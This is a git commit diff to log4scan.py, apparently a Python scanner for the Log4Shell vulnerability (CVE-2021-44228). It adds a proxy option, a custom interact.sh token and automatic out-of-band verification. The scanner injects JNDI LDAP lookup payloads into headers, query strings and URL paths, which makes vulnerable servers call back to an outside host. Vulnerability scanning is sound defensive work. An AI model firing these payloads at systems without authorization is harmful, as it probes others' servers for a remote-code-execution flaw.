4b381e8c40ea5c4fe4976d1da40822b0442264db
Federico Rapetti <f.rapetti@reply.it>
2021-12-14 16:47:42 +0100

    Use automatic verification as default Add support for proxy Add support for custom interact.sh server and token Refactor code and helps to improve readability Rename from log4shell to log4scan

--- log4scan.py
+++ log4scan.py
@@ -19,20 +19,21 @@ from Crypto.Hash import SHA256
 # Disable insecure SSL warning
 try:
     import requests.packages.urllib3
+
     requests.packages.urllib3.disable_warnings()
 except Exception:
     pass
 
-TESTING_HOST = "localhost:1389"
 TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
 INTERACTSH_PAYLOAD = "${jndi:ldap://HOST}"
-OUTPUT_FILE = "ids.csv"
+INTERACTSH_SERVER = "interactsh.com"
 HEADERS = [
-    "user-agent",
+    "User-Agent",
     "X-Api-Version",
-    "referer",
-    "x-forwarded-for"
+    "Referer",
+    "X-Forwarded-For"
 ]
+
 
 # Reference: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
 class Interactsh:
@@ -41,7 +42,7 @@ class Interactsh:
         self.public_key = rsa.publickey().exportKey()
         self.private_key = rsa.exportKey()
         self.token = token
-        self.server = server or 'interactsh.com'
+        self.server = server
         self.server = self.server.lstrip()
         self.headers = {
             "Content-Type": "application/json",
@@ -84,7 +85,7 @@ class Interactsh:
                     result.append(decrypt_data)
                 return result
             except Exception as e:
-                #logger.debug(e)
+                # logger.debug(e)
                 count -= 1
                 time.sleep(1)
                 continue
@@ -101,33 +102,9 @@ class Interactsh:
         plain_text = cryptor.decrypt(decode)
         return json.loads(plain_text[16:])
 
-    def build_payload(self, flag):
-        """
-        Generate the url and flag for verification
-        :param length: The flag length
-        :param method: Request type (dns|https|http), the default is https
-        :return: dict { url: Return the request url, flag: Return a random flag }
-        Example:
-          {
-            'url': 'http://hqlbbwmo8u.7735s13s04hp4eu19s4q8n963n73jw6hr.interactsh.com',
-            'flag': 'hqlbbwmo8u'
-          }
-        """
+    def build_payload(self, payload, flag):
         url = f'{flag}.{self.domain}'
-        return INTERACTSH_PAYLOAD.replace("HOST", url)
-
-    def verify(self, flag, get_result=False):
-        """
-        Check the flag
-        :param flag: The flag to verify
-        :param get_result: Whether to return detailed results
-        :return: Boolean
-        """
-        result = self.poll()
-        for item in result:
-            if flag.lower() in item['full-id']:
-                return (True, result) if get_result else True
-        return (False, result) if get_result else False
+        return payload.replace("HOST", url)
 
 
 def get_arguments():
@@ -143,28 +120,30 @@ def get_arguments():
                        help="endpoint to test")
     parser.add_argument("--http",
                         action="store_true",
-                        help="Test HTTP schema")
+                        help="Test HTTP on domains without explicit schema")
     parser.add_argument("--https",
                         action="store_true",
-                        help="Test HTTPS schema")
+                        help="Test HTTPS on domains without explicit schema")
     parser.add_argument("-p", "--payload",
                         action="store",
-                        default=TESTING_PAYLOAD,
                         help="template of the testing payload to use")
     parser.add_argument("--host",
                         action="store",
-                        default=TESTING_HOST,
+                        default=INTERACTSH_SERVER,
                         dest="host",
-                        help="host to replace in the HOST placeholder in the payload template")
+                        help=f"host to send LDAP request [default: {INTERACTSH_SERVER}]")
     parser.add_argument("-o", "--output",
                         action="store",
-                        default=OUTPUT_FILE,
-                        help="output file on which will be saved the endpoint-ID mappings",
-                        dest="output")
+                        help="output file with vulnerable hosts",
+                        dest="output_file")
+    parser.add_argument("-m", "--mappings",
+                        action="store",
+                        dest="mapping_file",
+                        help="output file with ID<->Endpoint mapping")
     parser.add_argument("-t", "--timeout",
                         action="store",
                         default=10,
-                        help="request timeout",
+                        help="request timeout [default: 10]",
                         dest="timeout",
                         type=int)
     parser.add_argument("-v", "--verbose",
@@ -175,16 +154,24 @@ def get_arguments():
                         action="store",
                         dest="headers",
                         help="file with a list of header to test")
-    parser.add_argument("--auto",
-                        action="store_true",
+    parser.add_argument("--manual",
+                        action="store_false",
                         dest="auto",
-                        help="use interact.sh to automatically verify if vulnerable")
+                        help="do not run automatic verification and use the simple payload instead")
+    parser.add_argument("--proxy",
+                        action="store",
+                        dest="proxy",
+                        help="send requests through proxy")
+    parser.add_argument("--token",
+                        action="store",
+                        dest="interact_token",
+                        help="Custom interact.sh token")
     test_group = parser.add_argument_group("Tests", "[default: Headers, Query, Path]")
     test_group.add_argument("--headers",
                             action="append_const",
                             dest="tests",
                             const="Headers",
-                            help="test headers injection like user-agent and referer, default is ids.csv")
+                            help="test headers injection like user-agent and referer")
     test_group.add_argument("--query",
                             action="append_const",
                             dest="tests",
@@ -198,6 +185,8 @@ def get_arguments():
     args = parser.parse_args()
     if args.tests is None:
         args.tests = ["Headers", "Query", "Path"]
+    if args.payload is None:
+        args.payload = INTERACTSH_PAYLOAD if args.auto else TESTING_PAYLOAD
     return args
 
 
@@ -234,12 +223,12 @@ def generate_mappings(endpoints):
 def test_entry(endpoint, payload, id, args):
     cprint(f"[*] [ID: {id}] Testing endpoint {endpoint}", "green")
     if args.verbose:
-        cprint(f" [%] Payload: {testing_payload}", color="cyan")
+        cprint(f"[%] Payload: {payload}", color="cyan")
     for test_key, test_fun in TESTS_LIST:
         try:
             test_fun(endpoint, payload, args)
         except Exception as e:
-            cprint(f" [!] [{test_key}] Test failed with: {e}", color="red")
+            cprint(f"[!] [{test_key}] Test failed with: {e}", color="red")
 
 
 def get_endpoints_from_entries(entries, http, https):
@@ -260,14 +249,19 @@ def get_endpoints_from_entries(entries, http, https):
 
 
 def log_mappings(mappings):
-    cprint(f"[*] Endpoint-ID mapping (exported in {OUTPUT_FILE}):", color="cyan", attrs=["bold", "underline"])
+    cprint(f"[*] Endpoint-ID mapping:", color="cyan", attrs=["bold", "underline"])
     for id, endpoint in mappings.items():
-        cprint(f" - {endpoint} -> {id}", color="white")
+        cprint(f"[*] - {endpoint} -> {id}", color="white")
 
 
-def generate_mapping_file(mappings, output):
-    with open(output, "w") as f:
+def generate_mapping_file(mappings, mapping_file):
+    with open(mapping_file, "w") as f:
         f.writelines([f"{id},{endpoint}\n" for id, endpoint in mappings.items()])
+
+
+def generate_result_file(endpoints, file):
+    with open(file, "w") as f:
+        f.writelines([f"{endpoint}\n" for endpoint in endpoints])
 
 
 # Tests
@@ -278,17 +272,26 @@ def test_header(endpoint, payload, args):
         headers = HEADERS
 
     headers = {header: payload for header in headers}
-    requests.get(endpoint, headers=headers, verify=False, timeout=args.timeout)
+    requests.get(endpoint, headers=headers,
+                 verify=False,
+                 timeout=args.timeout,
+                 proxies=args.proxy)
 
 
 def test_get(endpoint, payload, args):
     params = {"id": payload}
-    requests.get(endpoint, params=params, verify=False, timeout=args.timeout)
+    requests.get(endpoint, params=params,
+                 verify=False,
+                 timeout=args.timeout,
+                 proxies=args.proxy)
 
 
 def test_path(endpoint, payload, args):
     url = parse.urljoin(endpoint, parse.quote(payload, safe=''))
-    requests.get(url, verify=False, timeout=args.timeout)
+    requests.get(url,
+                 verify=False,
+                 timeout=args.timeout,
+                 proxies=args.proxy)
 
 
 TESTS_LIST = [("Headers", test_header),
@@ -296,11 +299,47 @@ TESTS_LIST = [("Headers", test_header),
               ("Path", test_path)]
 
 
-# MAIN
-if __name__ == '__main__':
+def execute_manual(mappings, args):
+    for id, endpoint in mappings.items():
+        testing_payload = build_testing_payload(id, args.host, args.payload)
+        test_entry(endpoint, testing_payload, id, args)
+
+
+def execute_interactsh(mappings, args):
+    cprint("[*] Initialize interact.sh", color="green")
+    service = Interactsh(args.interact_token, args.host)
+
+    for id, endpoint in mappings.items():
+        testing_payload = service.build_payload(args.payload, id)
+        test_entry(endpoint, testing_payload, id, args)
+
+    print()
+    cprint("[*] Start verification", color="cyan", attrs=["bold", "underline"])
+    logs = service.poll()
+    endpoints = {mappings[log["full-id"].split(".")[0]] for log in logs}
+
+    if len(endpoints) > 0:
+        cprint("[!!!] Vulnerable endpoints found!", color="red", attrs=["bold"])
+        for endpoint in endpoints:
+            cprint(f"[!] - {endpoint}", color="red")
+        if args.output_file:
+            generate_result_file(endpoints, args.output_file)
+    else:
+        cprint("[✔] No vulnerable endpoints found!", color="green", attrs=["bold"])
+
+
+def main():
     args = get_arguments()
+    cprint("""
+        __                __ __                      
+       / /   ____  ____ _/ // / ______________ _____ 
+      / /   / __ \/ __ `/ // /_/ ___/ ___/ __ `/ __ \\
+     / /___/ /_/ / /_/ /__  __(__  ) /__/ /_/ / / / /
+    /_____/\____/\__, /  /_/ /____/\___/\__,_/_/ /_/ 
+                /____/                               
+    """, color="yellow")
     cprint("[*] CVE-2021-44228 - Apache Log4j RCE Scanner", color="yellow")
-    cprint("[*] Developed by Federico Rapetti for Reply Communication Valley", color="yellow")
+    cprint("[*] Author: Federico Rapetti <Reply Communication Valley>", color="yellow")
     print()
     if args.filename is not None:
         entries = get_entries(args.filename)
@@ -308,31 +347,18 @@ if __name__ == '__main__':
         entries = [args.endpoint]
     mappings = generate_mappings(get_endpoints_from_entries(entries, args.http, args.https))
     log_mappings(mappings)
-    generate_mapping_file(mappings, args.output)
+    if args.mapping_file:
+        generate_mapping_file(mappings, args.mapping_file)
+
     print("")
 
-    cprint("[*] Start testing", color="magenta", attrs=["bold", "underline"])
+    cprint("[*] Start testing", color="cyan", attrs=["bold", "underline"])
     if args.auto:
-        cprint("[*] Initialize interact.sh", color="blue")
-        service = Interactsh()
+        execute_interactsh(mappings, args)
+    else:
+        execute_manual(mappings, args)
 
-    for id, endpoint in mappings.items():
-        if args.auto:
-            testing_payload = service.build_payload(id)
-        else:
-            testing_payload = build_testing_payload(id, args.host, args.payload)
 
-        test_entry(endpoint, testing_payload, id, args)
-
-    if args.auto:
-        print()
-        cprint("[*] Start verification", color="magenta", attrs=["bold", "underline"])
-        logs = service.poll()
-        endpoints = {mappings[log["full-id"].split(".")[0]] for log in logs}
-
-        if len(endpoints) > 0:
-            cprint("[!!!] Vulnerable endpoints found!", color="red", attrs=["bold"])
-            for endpoint in endpoints:
-                cprint(f" - {endpoint}", color="red")
-        else:
-            cprint("[✔] No vulnerable endpoints found!", color="green", attrs=["bold"])
+# MAIN
+if __name__ == '__main__':
+    main()
